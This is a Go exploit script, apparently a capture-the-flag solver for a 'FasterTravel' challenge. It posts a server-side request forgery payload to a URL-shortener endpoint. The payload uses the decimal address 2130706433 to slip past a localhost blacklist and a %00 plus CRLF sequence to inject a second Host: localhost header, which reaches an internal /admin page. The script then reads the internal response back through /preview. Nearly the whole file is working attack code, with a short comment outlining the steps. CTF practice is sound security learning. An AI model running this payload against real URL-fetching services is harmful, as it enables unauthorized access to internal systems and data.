package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"regexp"
	"strings"
)

// ACSC Qualification 2026 - FasterTravel
//
// 利用思路：
//   1. 使用 2130706433 绕过 localhost 黑名单
//   2. 在 source 参数中插入 %00 + CRLF 注入第二个 Host: localhost
//   3. 让 /admin 白名单放行
//   4. 再通过 /preview 读回内部响应中的 flag
//
// 运行示例：
// go run CTF_Writeups/scripts_go/ACSC2026Qualification_FasterTravel.go \
//   -base https://4ty7qe174n8cri3w.dyn.acsc.land

const (
	defaultBaseURL = "https://4ty7qe174n8cri3w.dyn.acsc.land"
	rawBody        = "source=http://2130706433%00%0d%0aHost:%20localhost%0d%0aFoo:%20bar:5001/admin"
)

func fetchText(client *http.Client, request *http.Request) (string, *http.Response, error) {
	response, err := client.Do(request)
	if err != nil {
		return "", nil, err
	}
	defer response.Body.Close()

	body, err := io.ReadAll(response.Body)
	if err != nil {
		return "", nil, err
	}
	return string(body), response, nil
}

func extractFlag(text string) (string, error) {
	re := regexp.MustCompile(`dach2026\{[^}]+\}`)
	flag := re.FindString(text)
	if flag == "" {
		return "", fmt.Errorf("flag not found in preview response")
	}
	return flag, nil
}

func main() {
	base := flag.String("base", defaultBaseURL, "target base URL")
	flag.Parse()

	normalizedBase := strings.TrimRight(*base, "/")
	fmt.Printf("[+] target: %s\n", normalizedBase)

	client := &http.Client{}

	shortenReq, err := http.NewRequest(http.MethodPost, normalizedBase+"/shorten", strings.NewReader(rawBody))
	if err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}
	shortenReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	_, shortenResp, err := fetchText(client, shortenReq)
	if err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}
	short := shortenResp.Request.URL.Path[strings.LastIndex(shortenResp.Request.URL.Path, "/")+1:]
	fmt.Printf("[+] short code: %s\n", short)

	previewReq, err := http.NewRequest(http.MethodGet, normalizedBase+"/preview?short="+short, nil)
	if err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}
	previewReq.Header.Set("Sec-Fetch-Dest", "iframe")
	previewReq.Header.Set("Sec-Fetch-Site", "same-origin")

	previewBody, _, err := fetchText(client, previewReq)
	if err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}

	flagValue, err := extractFlag(previewBody)
	if err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}

	fmt.Println(flagValue)
}
